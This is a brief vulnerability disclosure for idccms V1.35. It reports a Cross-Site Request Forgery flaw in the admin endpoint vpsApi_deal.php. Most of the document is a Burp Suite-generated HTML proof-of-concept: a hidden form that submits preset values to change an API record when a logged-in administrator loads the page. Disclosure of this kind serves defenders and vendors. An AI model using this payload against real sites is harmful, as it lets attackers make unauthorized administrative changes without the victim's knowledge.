
target:http://idccms.com/
version: V1.35

idccms V1.35 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  http://127.0.0.1:80/admin/vpsApi_deal.php?mudi=rev&nohrefStr=close

POC:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:80/admin/vpsApi_deal.php?mudi=rev&nohrefStr=close" method="POST">
      <input type="hidden" name="dataID" value="6" />
			<input type="hidden" name="dataTypeCN" value="%E6%8E%A5%E5%8F%A3%E7%B1%BB%E5%9E%8B" />
			<input type="hidden" name="dataType" value="" />
			<input type="hidden" name="dataMode" value="" />
			<input type="hidden" name="dataModeStr" value="" />
			<input type="hidden" name="backURL" value="http%3A%2F%2F127.0.0.1%2Fadmin%2FvpsApi.php%3Fmudi%3Dmanage%26dataMode%3D%26dataModeStr%3D%26dataType%3D%26dataTypeCN%3D%25E6%258E%25A5%25E5%258F%25A3%25E7%25B1%25BB%25E5%259E%258B%26dataType2%3D%26dataID%3D0%26menuID%3D655" />
			<input type="hidden" name="note" value="cs" />
			<input type="hidden" name="rank" value="5" />
			<input type="hidden" name="state" value="1" />
			<input type="hidden" name="x" value="0" />
			<input type="hidden" name="y" value="0" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
